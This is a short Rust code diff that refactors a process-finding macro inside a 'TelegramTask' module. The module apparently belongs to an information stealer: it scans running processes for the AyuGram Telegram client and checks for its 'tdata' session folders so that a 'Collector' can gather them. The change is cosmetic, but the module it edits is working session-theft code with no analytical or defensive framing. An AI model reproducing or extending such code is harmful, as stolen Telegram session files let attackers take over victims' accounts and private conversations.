@@ -16,7 +16,10 @@ use utils::process::{get_process_list, get_process_path_by_pid, ProcessInfo};
 pub(super) struct TelegramTask;
 
 macro_rules! find_first_process {
-    ($processes:expr => $client_name:expr; $($process_name:expr),+ => $extend:expr) => {
+    (
+        $client_name:expr,
+        $processes:expr => $($process_name:expr),+ $(,)? => $extend:expr
+    ) => {
         let mut found = false;
         $(
             if !found {
@@ -46,7 +49,8 @@ impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
         ];
 
         let processes = &get_process_list();
-        find_first_process!(processes => "AyuGram"; "AyuGram.exe" => paths);
+
+        find_first_process!("AyuGram", processes => "AyuGram.exe" => paths);
 
         for (client, tdata_path) in paths {
             if StorageFileSystem.is_exists(&tdata_path) {
